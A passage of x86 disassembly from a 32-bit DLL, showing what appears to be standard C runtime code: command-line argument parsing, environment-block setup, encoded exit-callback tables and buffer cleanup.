10004be4:	74 04                	je     0x10004bea
10004be6:	3c 09                	cmp    $0x9,%al
10004be8:	75 05                	jne    0x10004bef
10004bea:	47                   	inc    %edi
10004beb:	8a 07                	mov    (%edi),%al
10004bed:	eb f3                	jmp    0x10004be2
10004bef:	84 c0                	test   %al,%al
10004bf1:	0f 84 b0 00 00 00    	je     0x10004ca7
10004bf7:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10004bfa:	85 c9                	test   %ecx,%ecx
10004bfc:	74 08                	je     0x10004c06
10004bfe:	89 31                	mov    %esi,(%ecx)
10004c00:	83 c1 04             	add    $0x4,%ecx
10004c03:	89 4d 0c             	mov    %ecx,0xc(%ebp)
10004c06:	8b 45 14             	mov    0x14(%ebp),%eax
10004c09:	ff 00                	incl   (%eax)
10004c0b:	33 d2                	xor    %edx,%edx
10004c0d:	42                   	inc    %edx
10004c0e:	33 c0                	xor    %eax,%eax
10004c10:	eb 02                	jmp    0x10004c14
10004c12:	47                   	inc    %edi
10004c13:	40                   	inc    %eax
10004c14:	8a 0f                	mov    (%edi),%cl
10004c16:	80 f9 5c             	cmp    $0x5c,%cl
10004c19:	74 f7                	je     0x10004c12
10004c1b:	80 f9 22             	cmp    $0x22,%cl
10004c1e:	75 31                	jne    0x10004c51
10004c20:	a8 01                	test   $0x1,%al
10004c22:	75 1e                	jne    0x10004c42
10004c24:	8a 4d ff             	mov    -0x1(%ebp),%cl
10004c27:	84 c9                	test   %cl,%cl
10004c29:	74 0f                	je     0x10004c3a
10004c2b:	8d 4f 01             	lea    0x1(%edi),%ecx
10004c2e:	80 39 22             	cmpb   $0x22,(%ecx)
10004c31:	75 04                	jne    0x10004c37
10004c33:	8b f9                	mov    %ecx,%edi
10004c35:	eb 0b                	jmp    0x10004c42
10004c37:	8a 4d ff             	mov    -0x1(%ebp),%cl
10004c3a:	33 d2                	xor    %edx,%edx
10004c3c:	84 c9                	test   %cl,%cl
10004c3e:	0f 94 45 ff          	sete   -0x1(%ebp)
10004c42:	d1 e8                	shr    $1,%eax
10004c44:	eb 0b                	jmp    0x10004c51
10004c46:	48                   	dec    %eax
10004c47:	85 f6                	test   %esi,%esi
10004c49:	74 04                	je     0x10004c4f
10004c4b:	c6 06 5c             	movb   $0x5c,(%esi)
10004c4e:	46                   	inc    %esi
10004c4f:	ff 03                	incl   (%ebx)
10004c51:	85 c0                	test   %eax,%eax
10004c53:	75 f1                	jne    0x10004c46
10004c55:	8a 07                	mov    (%edi),%al
10004c57:	84 c0                	test   %al,%al
10004c59:	74 3d                	je     0x10004c98
10004c5b:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
10004c5f:	75 08                	jne    0x10004c69
10004c61:	3c 20                	cmp    $0x20,%al
10004c63:	74 33                	je     0x10004c98
10004c65:	3c 09                	cmp    $0x9,%al
10004c67:	74 2f                	je     0x10004c98
10004c69:	85 d2                	test   %edx,%edx
10004c6b:	74 25                	je     0x10004c92
10004c6d:	85 f6                	test   %esi,%esi
10004c6f:	74 05                	je     0x10004c76
10004c71:	88 06                	mov    %al,(%esi)
10004c73:	46                   	inc    %esi
10004c74:	8a 07                	mov    (%edi),%al
10004c76:	0f be c0             	movsbl %al,%eax
10004c79:	50                   	push   %eax
10004c7a:	e8 56 2f 00 00       	call   0x10007bd5
10004c7f:	59                   	pop    %ecx
10004c80:	85 c0                	test   %eax,%eax
10004c82:	74 0c                	je     0x10004c90
10004c84:	47                   	inc    %edi
10004c85:	ff 03                	incl   (%ebx)
10004c87:	85 f6                	test   %esi,%esi
10004c89:	74 05                	je     0x10004c90
10004c8b:	8a 07                	mov    (%edi),%al
10004c8d:	88 06                	mov    %al,(%esi)
10004c8f:	46                   	inc    %esi
10004c90:	ff 03                	incl   (%ebx)
10004c92:	47                   	inc    %edi
10004c93:	e9 73 ff ff ff       	jmp    0x10004c0b
10004c98:	85 f6                	test   %esi,%esi
10004c9a:	74 04                	je     0x10004ca0
10004c9c:	c6 06 00             	movb   $0x0,(%esi)
10004c9f:	46                   	inc    %esi
10004ca0:	ff 03                	incl   (%ebx)
10004ca2:	e9 31 ff ff ff       	jmp    0x10004bd8
10004ca7:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10004caa:	5f                   	pop    %edi
10004cab:	5e                   	pop    %esi
10004cac:	5b                   	pop    %ebx
10004cad:	85 c9                	test   %ecx,%ecx
10004caf:	74 03                	je     0x10004cb4
10004cb1:	83 21 00             	andl   $0x0,(%ecx)
10004cb4:	8b 45 14             	mov    0x14(%ebp),%eax
10004cb7:	ff 00                	incl   (%eax)
10004cb9:	c9                   	leave
10004cba:	c3                   	ret
10004cbb:	8b ff                	mov    %edi,%edi
10004cbd:	55                   	push   %ebp
10004cbe:	8b ec                	mov    %esp,%ebp
10004cc0:	56                   	push   %esi
10004cc1:	8b 75 08             	mov    0x8(%ebp),%esi
10004cc4:	81 fe ff ff ff 3f    	cmp    $0x3fffffff,%esi
10004cca:	73 39                	jae    0x10004d05
10004ccc:	83 c8 ff             	or     $0xffffffff,%eax
10004ccf:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10004cd2:	33 d2                	xor    %edx,%edx
10004cd4:	f7 75 10             	divl   0x10(%ebp)
10004cd7:	3b c8                	cmp    %eax,%ecx
10004cd9:	73 2a                	jae    0x10004d05
10004cdb:	0f af 4d 10          	imul   0x10(%ebp),%ecx
10004cdf:	c1 e6 02             	shl    $0x2,%esi
10004ce2:	8b c6                	mov    %esi,%eax
10004ce4:	f7 d0                	not    %eax
10004ce6:	3b c1                	cmp    %ecx,%eax
10004ce8:	76 1b                	jbe    0x10004d05
10004cea:	8d 04 0e             	lea    (%esi,%ecx,1),%eax
10004ced:	6a 01                	push   $0x1
10004cef:	50                   	push   %eax
10004cf0:	e8 34 09 00 00       	call   0x10005629
10004cf5:	6a 00                	push   $0x0
10004cf7:	8b f0                	mov    %eax,%esi
10004cf9:	e8 88 09 00 00       	call   0x10005686
10004cfe:	83 c4 0c             	add    $0xc,%esp
10004d01:	8b c6                	mov    %esi,%eax
10004d03:	eb 02                	jmp    0x10004d07
10004d05:	33 c0                	xor    %eax,%eax
10004d07:	5e                   	pop    %esi
10004d08:	5d                   	pop    %ebp
10004d09:	c3                   	ret
10004d0a:	8b ff                	mov    %edi,%edi
10004d0c:	55                   	push   %ebp
10004d0d:	8b ec                	mov    %esp,%ebp
10004d0f:	5d                   	pop    %ebp
10004d10:	e9 f9 fc ff ff       	jmp    0x10004a0e
10004d15:	83 3d 38 42 01 10 00 	cmpl   $0x0,0x10014238
10004d1c:	74 03                	je     0x10004d21
10004d1e:	33 c0                	xor    %eax,%eax
10004d20:	c3                   	ret
10004d21:	56                   	push   %esi
10004d22:	57                   	push   %edi
10004d23:	e8 87 2b 00 00       	call   0x100078af
10004d28:	e8 39 30 00 00       	call   0x10007d66
10004d2d:	8b f0                	mov    %eax,%esi
10004d2f:	85 f6                	test   %esi,%esi
10004d31:	75 05                	jne    0x10004d38
10004d33:	83 cf ff             	or     $0xffffffff,%edi
10004d36:	eb 24                	jmp    0x10004d5c
10004d38:	56                   	push   %esi
10004d39:	e8 2a 00 00 00       	call   0x10004d68
10004d3e:	59                   	pop    %ecx
10004d3f:	85 c0                	test   %eax,%eax
10004d41:	75 05                	jne    0x10004d48
10004d43:	83 cf ff             	or     $0xffffffff,%edi
10004d46:	eb 0c                	jmp    0x10004d54
10004d48:	a3 44 42 01 10       	mov    %eax,0x10014244
10004d4d:	33 ff                	xor    %edi,%edi
10004d4f:	a3 38 42 01 10       	mov    %eax,0x10014238
10004d54:	6a 00                	push   $0x0
10004d56:	e8 2b 09 00 00       	call   0x10005686
10004d5b:	59                   	pop    %ecx
10004d5c:	56                   	push   %esi
10004d5d:	e8 24 09 00 00       	call   0x10005686
10004d62:	59                   	pop    %ecx
10004d63:	8b c7                	mov    %edi,%eax
10004d65:	5f                   	pop    %edi
10004d66:	5e                   	pop    %esi
10004d67:	c3                   	ret
10004d68:	8b ff                	mov    %edi,%edi
10004d6a:	55                   	push   %ebp
10004d6b:	8b ec                	mov    %esp,%ebp
10004d6d:	51                   	push   %ecx
10004d6e:	51                   	push   %ecx
10004d6f:	53                   	push   %ebx
10004d70:	8b 5d 08             	mov    0x8(%ebp),%ebx
10004d73:	33 d2                	xor    %edx,%edx
10004d75:	56                   	push   %esi
10004d76:	57                   	push   %edi
10004d77:	8b f3                	mov    %ebx,%esi
10004d79:	8a 03                	mov    (%ebx),%al
10004d7b:	eb 18                	jmp    0x10004d95
10004d7d:	3c 3d                	cmp    $0x3d,%al
10004d7f:	74 01                	je     0x10004d82
10004d81:	42                   	inc    %edx
10004d82:	8b ce                	mov    %esi,%ecx
10004d84:	8d 79 01             	lea    0x1(%ecx),%edi
10004d87:	8a 01                	mov    (%ecx),%al
10004d89:	41                   	inc    %ecx
10004d8a:	84 c0                	test   %al,%al
10004d8c:	75 f9                	jne    0x10004d87
10004d8e:	2b cf                	sub    %edi,%ecx
10004d90:	46                   	inc    %esi
10004d91:	03 f1                	add    %ecx,%esi
10004d93:	8a 06                	mov    (%esi),%al
10004d95:	84 c0                	test   %al,%al
10004d97:	75 e4                	jne    0x10004d7d
10004d99:	8d 42 01             	lea    0x1(%edx),%eax
10004d9c:	6a 04                	push   $0x4
10004d9e:	50                   	push   %eax
10004d9f:	e8 85 08 00 00       	call   0x10005629
10004da4:	8b f8                	mov    %eax,%edi
10004da6:	59                   	pop    %ecx
10004da7:	59                   	pop    %ecx
10004da8:	85 ff                	test   %edi,%edi
10004daa:	74 6e                	je     0x10004e1a
10004dac:	89 7d fc             	mov    %edi,-0x4(%ebp)
10004daf:	eb 52                	jmp    0x10004e03
10004db1:	8b cb                	mov    %ebx,%ecx
10004db3:	8d 71 01             	lea    0x1(%ecx),%esi
10004db6:	8a 01                	mov    (%ecx),%al
10004db8:	41                   	inc    %ecx
10004db9:	84 c0                	test   %al,%al
10004dbb:	75 f9                	jne    0x10004db6
10004dbd:	2b ce                	sub    %esi,%ecx
10004dbf:	8d 41 01             	lea    0x1(%ecx),%eax
10004dc2:	89 45 f8             	mov    %eax,-0x8(%ebp)
10004dc5:	80 fa 3d             	cmp    $0x3d,%dl
10004dc8:	74 37                	je     0x10004e01
10004dca:	6a 01                	push   $0x1
10004dcc:	50                   	push   %eax
10004dcd:	e8 57 08 00 00       	call   0x10005629
10004dd2:	8b f0                	mov    %eax,%esi
10004dd4:	59                   	pop    %ecx
10004dd5:	59                   	pop    %ecx
10004dd6:	85 f6                	test   %esi,%esi
10004dd8:	74 31                	je     0x10004e0b
10004dda:	53                   	push   %ebx
10004ddb:	ff 75 f8             	push   -0x8(%ebp)
10004dde:	56                   	push   %esi
10004ddf:	e8 69 04 00 00       	call   0x1000524d
10004de4:	83 c4 0c             	add    $0xc,%esp
10004de7:	85 c0                	test   %eax,%eax
10004de9:	75 40                	jne    0x10004e2b
10004deb:	8b 45 fc             	mov    -0x4(%ebp),%eax
10004dee:	6a 00                	push   $0x0
10004df0:	89 30                	mov    %esi,(%eax)
10004df2:	83 c0 04             	add    $0x4,%eax
10004df5:	89 45 fc             	mov    %eax,-0x4(%ebp)
10004df8:	e8 89 08 00 00       	call   0x10005686
10004dfd:	8b 45 f8             	mov    -0x8(%ebp),%eax
10004e00:	59                   	pop    %ecx
10004e01:	03 d8                	add    %eax,%ebx
10004e03:	8a 13                	mov    (%ebx),%dl
10004e05:	84 d2                	test   %dl,%dl
10004e07:	75 a8                	jne    0x10004db1
10004e09:	eb 11                	jmp    0x10004e1c
10004e0b:	57                   	push   %edi
10004e0c:	e8 27 00 00 00       	call   0x10004e38
10004e11:	6a 00                	push   $0x0
10004e13:	e8 6e 08 00 00       	call   0x10005686
10004e18:	59                   	pop    %ecx
10004e19:	59                   	pop    %ecx
10004e1a:	33 ff                	xor    %edi,%edi
10004e1c:	6a 00                	push   $0x0
10004e1e:	e8 63 08 00 00       	call   0x10005686
10004e23:	59                   	pop    %ecx
10004e24:	8b c7                	mov    %edi,%eax
10004e26:	5f                   	pop    %edi
10004e27:	5e                   	pop    %esi
10004e28:	5b                   	pop    %ebx
10004e29:	c9                   	leave
10004e2a:	c3                   	ret
10004e2b:	33 c0                	xor    %eax,%eax
10004e2d:	50                   	push   %eax
10004e2e:	50                   	push   %eax
10004e2f:	50                   	push   %eax
10004e30:	50                   	push   %eax
10004e31:	50                   	push   %eax
10004e32:	e8 32 07 00 00       	call   0x10005569
10004e37:	cc                   	int3
10004e38:	8b ff                	mov    %edi,%edi
10004e3a:	55                   	push   %ebp
10004e3b:	8b ec                	mov    %esp,%ebp
10004e3d:	56                   	push   %esi
10004e3e:	8b 75 08             	mov    0x8(%ebp),%esi
10004e41:	85 f6                	test   %esi,%esi
10004e43:	74 1f                	je     0x10004e64
10004e45:	8b 06                	mov    (%esi),%eax
10004e47:	57                   	push   %edi
10004e48:	8b fe                	mov    %esi,%edi
10004e4a:	eb 0c                	jmp    0x10004e58
10004e4c:	50                   	push   %eax
10004e4d:	e8 34 08 00 00       	call   0x10005686
10004e52:	8d 7f 04             	lea    0x4(%edi),%edi
10004e55:	8b 07                	mov    (%edi),%eax
10004e57:	59                   	pop    %ecx
10004e58:	85 c0                	test   %eax,%eax
10004e5a:	75 f0                	jne    0x10004e4c
10004e5c:	56                   	push   %esi
10004e5d:	e8 24 08 00 00       	call   0x10005686
10004e62:	59                   	pop    %ecx
10004e63:	5f                   	pop    %edi
10004e64:	5e                   	pop    %esi
10004e65:	5d                   	pop    %ebp
10004e66:	c3                   	ret
10004e67:	8b ff                	mov    %edi,%edi
10004e69:	55                   	push   %ebp
10004e6a:	8b ec                	mov    %esp,%ebp
10004e6c:	56                   	push   %esi
10004e6d:	8b f1                	mov    %ecx,%esi
10004e6f:	57                   	push   %edi
10004e70:	8d 7e 04             	lea    0x4(%esi),%edi
10004e73:	eb 11                	jmp    0x10004e86
10004e75:	8b 4d 08             	mov    0x8(%ebp),%ecx
10004e78:	56                   	push   %esi
10004e79:	ff 15 5c d1 00 10    	call   *0x1000d15c
10004e7f:	ff 55 08             	call   *0x8(%ebp)
10004e82:	59                   	pop    %ecx
10004e83:	83 c6 04             	add    $0x4,%esi
10004e86:	3b f7                	cmp    %edi,%esi
10004e88:	75 eb                	jne    0x10004e75
10004e8a:	5f                   	pop    %edi
10004e8b:	5e                   	pop    %esi
10004e8c:	5d                   	pop    %ebp
10004e8d:	c2 04 00             	ret    $0x4
10004e90:	8b ff                	mov    %edi,%edi
10004e92:	55                   	push   %ebp
10004e93:	8b ec                	mov    %esp,%ebp
10004e95:	8b 45 08             	mov    0x8(%ebp),%eax
10004e98:	8b 00                	mov    (%eax),%eax
10004e9a:	3b 05 44 42 01 10    	cmp    0x10014244,%eax
10004ea0:	74 07                	je     0x10004ea9
10004ea2:	50                   	push   %eax
10004ea3:	e8 90 ff ff ff       	call   0x10004e38
10004ea8:	59                   	pop    %ecx
10004ea9:	5d                   	pop    %ebp
10004eaa:	c3                   	ret
10004eab:	8b ff                	mov    %edi,%edi
10004ead:	55                   	push   %ebp
10004eae:	8b ec                	mov    %esp,%ebp
10004eb0:	8b 45 08             	mov    0x8(%ebp),%eax
10004eb3:	8b 00                	mov    (%eax),%eax
10004eb5:	3b 05 40 42 01 10    	cmp    0x10014240,%eax
10004ebb:	74 07                	je     0x10004ec4
10004ebd:	50                   	push   %eax
10004ebe:	e8 75 ff ff ff       	call   0x10004e38
10004ec3:	59                   	pop    %ecx
10004ec4:	5d                   	pop    %ebp
10004ec5:	c3                   	ret
10004ec6:	68 90 4e 00 10       	push   $0x10004e90
10004ecb:	b9 38 42 01 10       	mov    $0x10014238,%ecx
10004ed0:	e8 92 ff ff ff       	call   0x10004e67
10004ed5:	68 ab 4e 00 10       	push   $0x10004eab
10004eda:	b9 3c 42 01 10       	mov    $0x1001423c,%ecx
10004edf:	e8 83 ff ff ff       	call   0x10004e67
10004ee4:	ff 35 44 42 01 10    	push   0x10014244
10004eea:	e8 49 ff ff ff       	call   0x10004e38
10004eef:	ff 35 40 42 01 10    	push   0x10014240
10004ef5:	e8 3e ff ff ff       	call   0x10004e38
10004efa:	59                   	pop    %ecx
10004efb:	59                   	pop    %ecx
10004efc:	c3                   	ret
10004efd:	e9 13 fe ff ff       	jmp    0x10004d15
10004f02:	6a 0c                	push   $0xc
10004f04:	68 d8 23 01 10       	push   $0x100123d8
10004f09:	e8 92 d7 ff ff       	call   0x100026a0
10004f0e:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
10004f12:	8b 45 08             	mov    0x8(%ebp),%eax
10004f15:	ff 30                	push   (%eax)
10004f17:	e8 10 1a 00 00       	call   0x1000692c
10004f1c:	59                   	pop    %ecx
10004f1d:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10004f21:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10004f24:	e8 34 00 00 00       	call   0x10004f5d
10004f29:	8b f0                	mov    %eax,%esi
10004f2b:	89 75 e4             	mov    %esi,-0x1c(%ebp)
10004f2e:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
10004f35:	e8 17 00 00 00       	call   0x10004f51
10004f3a:	8b c6                	mov    %esi,%eax
10004f3c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10004f3f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10004f46:	59                   	pop    %ecx
10004f47:	5f                   	pop    %edi
10004f48:	5e                   	pop    %esi
10004f49:	5b                   	pop    %ebx
10004f4a:	c9                   	leave
10004f4b:	c2 0c 00             	ret    $0xc
10004f4e:	8b 75 e4             	mov    -0x1c(%ebp),%esi
10004f51:	8b 45 10             	mov    0x10(%ebp),%eax
10004f54:	ff 30                	push   (%eax)
10004f56:	e8 19 1a 00 00       	call   0x10006974
10004f5b:	59                   	pop    %ecx
10004f5c:	c3                   	ret
10004f5d:	8b ff                	mov    %edi,%edi
10004f5f:	55                   	push   %ebp
10004f60:	8b ec                	mov    %esp,%ebp
10004f62:	83 ec 14             	sub    $0x14,%esp
10004f65:	53                   	push   %ebx
10004f66:	8b d9                	mov    %ecx,%ebx
10004f68:	57                   	push   %edi
10004f69:	89 5d ec             	mov    %ebx,-0x14(%ebp)
10004f6c:	8b 03                	mov    (%ebx),%eax
10004f6e:	8b 38                	mov    (%eax),%edi
10004f70:	85 ff                	test   %edi,%edi
10004f72:	75 08                	jne    0x10004f7c
10004f74:	83 c8 ff             	or     $0xffffffff,%eax
10004f77:	e9 b7 00 00 00       	jmp    0x10005033
10004f7c:	8b 15 04 30 01 10    	mov    0x10013004,%edx
10004f82:	8b ca                	mov    %edx,%ecx
10004f84:	56                   	push   %esi
10004f85:	8b 37                	mov    (%edi),%esi
10004f87:	83 e1 1f             	and    $0x1f,%ecx
10004f8a:	8b 7f 04             	mov    0x4(%edi),%edi
10004f8d:	33 f2                	xor    %edx,%esi
10004f8f:	33 fa                	xor    %edx,%edi
10004f91:	d3 ce                	ror    %cl,%esi
10004f93:	d3 cf                	ror    %cl,%edi
10004f95:	85 f6                	test   %esi,%esi
10004f97:	0f 84 93 00 00 00    	je     0x10005030
10004f9d:	83 fe ff             	cmp    $0xffffffff,%esi
10004fa0:	0f 84 8a 00 00 00    	je     0x10005030
10004fa6:	89 55 fc             	mov    %edx,-0x4(%ebp)
10004fa9:	89 7d f4             	mov    %edi,-0xc(%ebp)
10004fac:	89 75 f8             	mov    %esi,-0x8(%ebp)
10004faf:	83 ef 04             	sub    $0x4,%edi
10004fb2:	3b fe                	cmp    %esi,%edi
10004fb4:	72 54                	jb     0x1000500a
10004fb6:	8b 07                	mov    (%edi),%eax
10004fb8:	3b 45 fc             	cmp    -0x4(%ebp),%eax
10004fbb:	74 f2                	je     0x10004faf
10004fbd:	33 c2                	xor    %edx,%eax
10004fbf:	8b 55 fc             	mov    -0x4(%ebp),%edx
10004fc2:	d3 c8                	ror    %cl,%eax
10004fc4:	8b c8                	mov    %eax,%ecx
10004fc6:	89 17                	mov    %edx,(%edi)
10004fc8:	89 45 f0             	mov    %eax,-0x10(%ebp)
10004fcb:	ff 15 5c d1 00 10    	call   *0x1000d15c
10004fd1:	ff 55 f0             	call   *-0x10(%ebp)
10004fd4:	8b 03                	mov    (%ebx),%eax
10004fd6:	8b 15 04 30 01 10    	mov    0x10013004,%edx
10004fdc:	8b ca                	mov    %edx,%ecx
10004fde:	83 e1 1f             	and    $0x1f,%ecx
10004fe1:	8b 00                	mov    (%eax),%eax
10004fe3:	8b 18                	mov    (%eax),%ebx
10004fe5:	8b 40 04             	mov    0x4(%eax),%eax
10004fe8:	33 da                	xor    %edx,%ebx
10004fea:	d3 cb                	ror    %cl,%ebx
10004fec:	33 c2                	xor    %edx,%eax
10004fee:	d3 c8                	ror    %cl,%eax
10004ff0:	3b 5d f8             	cmp    -0x8(%ebp),%ebx
10004ff3:	89 5d f0             	mov    %ebx,-0x10(%ebp)
10004ff6:	8b 5d ec             	mov    -0x14(%ebp),%ebx
10004ff9:	75 05                	jne    0x10005000
10004ffb:	3b 45 f4             	cmp    -0xc(%ebp),%eax
10004ffe:	74 af                	je     0x10004faf
10005000:	8b 75 f0             	mov    -0x10(%ebp),%esi
10005003:	8b f8                	mov    %eax,%edi
10005005:	89 45 f4             	mov    %eax,-0xc(%ebp)
10005008:	eb a2                	jmp    0x10004fac
1000500a:	83 fe ff             	cmp    $0xffffffff,%esi
1000500d:	74 0d                	je     0x1000501c
1000500f:	56                   	push   %esi
10005010:	e8 71 06 00 00       	call   0x10005686
10005015:	8b 15 04 30 01 10    	mov    0x10013004,%edx
1000501b:	59                   	pop    %ecx
1000501c:	8b 03                	mov    (%ebx),%eax
1000501e:	8b 00                	mov    (%eax),%eax
10005020:	89 10                	mov    %edx,(%eax)
10005022:	8b 03                	mov    (%ebx),%eax
10005024:	8b 00                	mov    (%eax),%eax
10005026:	89 50 04             	mov    %edx,0x4(%eax)
10005029:	8b 03                	mov    (%ebx),%eax
1000502b:	8b 00                	mov    (%eax),%eax
1000502d:	89 50 08             	mov    %edx,0x8(%eax)
10005030:	33 c0                	xor    %eax,%eax
10005032:	5e                   	pop    %esi
10005033:	5f                   	pop    %edi
10005034:	5b                   	pop    %ebx
10005035:	c9                   	leave
10005036:	c3                   	ret
10005037:	8b ff                	mov    %edi,%edi
10005039:	55                   	push   %ebp
1000503a:	8b ec                	mov    %esp,%ebp
1000503c:	83 ec 10             	sub    $0x10,%esp
1000503f:	6a 02                	push   $0x2
10005041:	8d 45 08             	lea    0x8(%ebp),%eax
10005044:	89 45 f4             	mov    %eax,-0xc(%ebp)
10005047:	8d 4d ff             	lea    -0x1(%ebp),%ecx
1000504a:	58                   	pop    %eax
1000504b:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000504e:	89 45 f0             	mov    %eax,-0x10(%ebp)
10005051:	8d 45 f8             	lea    -0x8(%ebp),%eax
10005054:	50                   	push   %eax
10005055:	8d 45 f4             	lea    -0xc(%ebp),%eax
10005058:	50                   	push   %eax
10005059:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000505c:	50                   	push   %eax
1000505d:	e8 a0 fe ff ff       	call   0x10004f02
10005062:	c9                   	leave
10005063:	c3                   	ret
10005064:	8b ff                	mov    %edi,%edi
10005066:	55                   	push   %ebp
10005067:	8b ec                	mov    %esp,%ebp
10005069:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000506c:	85 c9                	test   %ecx,%ecx
1000506e:	75 05                	jne    0x10005075
10005070:	83 c8 ff             	or     $0xffffffff,%eax
10005073:	5d                   	pop    %ebp
10005074:	c3                   	ret
10005075:	8b 01                	mov    (%ecx),%eax
10005077:	3b 41 08             	cmp    0x8(%ecx),%eax
1000507a:	75 0d                	jne    0x10005089
1000507c:	a1 04 30 01 10       	mov    0x10013004,%eax
10005081:	89 01                	mov    %eax,(%ecx)
10005083:	89 41 04             	mov    %eax,0x4(%ecx)
10005086:	89 41 08             	mov    %eax,0x8(%ecx)
10005089:	33 c0                	xor    %eax,%eax
1000508b:	5d                   	pop    %ebp
1000508c:	c3                   	ret
1000508d:	b0 01                	mov    $0x1,%al
1000508f:	c3                   	ret
10005090:	c7 05 58 45 01 10 10 	movl   $0x10013110,0x10014558
10005097:	31 01 10 
1000509a:	b0 01                	mov    $0x1,%al
1000509c:	c3                   	ret
1000509d:	68 48 42 01 10       	push   $0x10014248
100050a2:	e8 bd ff ff ff       	call   0x10005064
100050a7:	c7 04 24 54 42 01 10 	movl   $0x10014254,(%esp)
100050ae:	e8 b1 ff ff ff       	call   0x10005064
100050b3:	59                   	pop    %ecx
100050b4:	b0 01                	mov    $0x1,%al
100050b6:	c3                   	ret
100050b7:	e8 0a fe ff ff       	call   0x10004ec6
100050bc:	b0 01                	mov    $0x1,%al
100050be:	c3                   	ret
100050bf:	8b ff                	mov    %edi,%edi
100050c1:	56                   	push   %esi
100050c2:	8b 35 04 30 01 10    	mov    0x10013004,%esi
100050c8:	56                   	push   %esi
100050c9:	e8 18 04 00 00       	call   0x100054e6
100050ce:	56                   	push   %esi
100050cf:	e8 79 f4 ff ff       	call   0x1000454d
100050d4:	56                   	push   %esi
100050d5:	e8 26 2f 00 00       	call   0x10008000
100050da:	56                   	push   %esi
100050db:	e8 5a 31 00 00       	call   0x1000823a
100050e0:	56                   	push   %esi
100050e1:	e8 ed f8 ff ff       	call   0x100049d3
100050e6:	83 c4 14             	add    $0x14,%esp
100050e9:	b0 01                	mov    $0x1,%al
100050eb:	5e                   	pop    %esi
100050ec:	c3                   	ret
100050ed:	6a 00                	push   $0x0
100050ef:	e8 32 db ff ff       	call   0x10002c26
100050f4:	59                   	pop    %ecx
100050f5:	c3                   	ret
100050f6:	8b ff                	mov    %edi,%edi
100050f8:	55                   	push   %ebp
100050f9:	8b ec                	mov    %esp,%ebp
100050fb:	51                   	push   %ecx
100050fc:	68 bc 46 01 10       	push   $0x100146bc
10005101:	8d 4d ff             	lea    -0x1(%ebp),%ecx
10005104:	e8 73 00 00 00       	call   0x1000517c
10005109:	b0 01                	mov    $0x1,%al
1000510b:	c9                   	leave
1000510c:	c3                   	ret
1000510d:	8b ff                	mov    %edi,%edi
1000510f:	56                   	push   %esi
10005110:	ff 35 4c 45 01 10    	push   0x1001454c
10005116:	e8 6b 05 00 00       	call   0x10005686
1000511b:	ff 35 50 45 01 10    	push   0x10014550
10005121:	33 f6                	xor    %esi,%esi
10005123:	89 35 4c 45 01 10    	mov    %esi,0x1001454c
10005129:	e8 58 05 00 00       	call   0x10005686
1000512e:	ff 35 d0 46 01 10    	push   0x100146d0
10005134:	89 35 50 45 01 10    	mov    %esi,0x10014550
1000513a:	e8 47 05 00 00       	call   0x10005686
1000513f:	ff 35 d4 46 01 10    	push   0x100146d4
10005145:	89 35 d0 46 01 10    	mov    %esi,0x100146d0
1000514b:	e8 36 05 00 00       	call   0x10005686
10005150:	83 c4 10             	add    $0x10,%esp
10005153:	89 35 d4 46 01 10    	mov    %esi,0x100146d4
10005159:	b0 01                	mov    $0x1,%al
1000515b:	5e                   	pop    %esi
1000515c:	c3                   	ret
1000515d:	8b ff                	mov    %edi,%edi
1000515f:	55                   	push   %ebp
10005160:	8b ec                	mov    %esp,%ebp
10005162:	a1 04 30 01 10       	mov    0x10013004,%eax
10005167:	83 e0 1f             	and    $0x1f,%eax
1000516a:	6a 20                	push   $0x20
1000516c:	59                   	pop    %ecx
1000516d:	2b c8                	sub    %eax,%ecx
1000516f:	8b 45 08             	mov    0x8(%ebp),%eax
10005172:	d3 c8                	ror    %cl,%eax
10005174:	33 05 04 30 01 10    	xor    0x10013004,%eax
1000517a:	5d                   	pop    %ebp
1000517b:	c3                   	ret
1000517c:	8b ff                	mov    %edi,%edi
1000517e:	55                   	push   %ebp
1000517f:	8b ec                	mov    %esp,%ebp
10005181:	56                   	push   %esi
10005182:	8b 75 08             	mov    0x8(%ebp),%esi
10005185:	83 c9 ff             	or     $0xffffffff,%ecx
10005188:	8b 06                	mov    (%esi),%eax
1000518a:	f0 0f c1 08          	lock xadd %ecx,(%eax)
1000518e:	75 15                	jne    0x100051a5
10005190:	57                   	push   %edi
10005191:	bf d8 31 01 10       	mov    $0x100131d8,%edi
10005196:	39 3e                	cmp    %edi,(%esi)
10005198:	74 0a                	je     0x100051a4
1000519a:	ff 36                	push   (%esi)
1000519c:	e8 e5 04 00 00       	call   0x10005686
100051a1:	59                   	pop    %ecx
100051a2:	89 3e                	mov    %edi,(%esi)
100051a4:	5f                   	pop    %edi
100051a5:	5e                   	pop    %esi
100051a6:	5d                   	pop    %ebp
100051a7:	c2 04 00             	ret    $0x4
100051aa:	68 18 de 00 10       	push   $0x1000de18
100051af:	68 98 dd 00 10       	push   $0x1000dd98
100051b4:	e8 b9 2c 00 00       	call   0x10007e72
100051b9:	59                   	pop    %ecx
100051ba:	59                   	pop    %ecx
100051bb:	c3                   	ret
100051bc:	e8 0e 15 00 00       	call   0x100066cf
100051c1:	85 c0                	test   %eax,%eax
100051c3:	0f 95 c0             	setne  %al
100051c6:	c3                   	ret
100051c7:	e8 80 13 00 00       	call   0x1000654c
100051cc:	b0 01                	mov    $0x1,%al
100051ce:	c3                   	ret
100051cf:	8b ff                	mov    %edi,%edi
100051d1:	55                   	push   %ebp
100051d2:	8b ec                	mov    %esp,%ebp
100051d4:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
100051d8:	74 12                	je     0x100051ec
100051da:	83 3d 1c 41 01 10 00 	cmpl   $0x0,0x1001411c
100051e1:	74 05                	je     0x100051e8
100051e3:	e8 3d 0c 00 00       	call   0x10005e25
100051e8:	b0 01                	mov    $0x1,%al
100051ea:	5d                   	pop    %ebp
100051eb:	c3                   	ret
100051ec:	68 18 de 00 10       	push   $0x1000de18
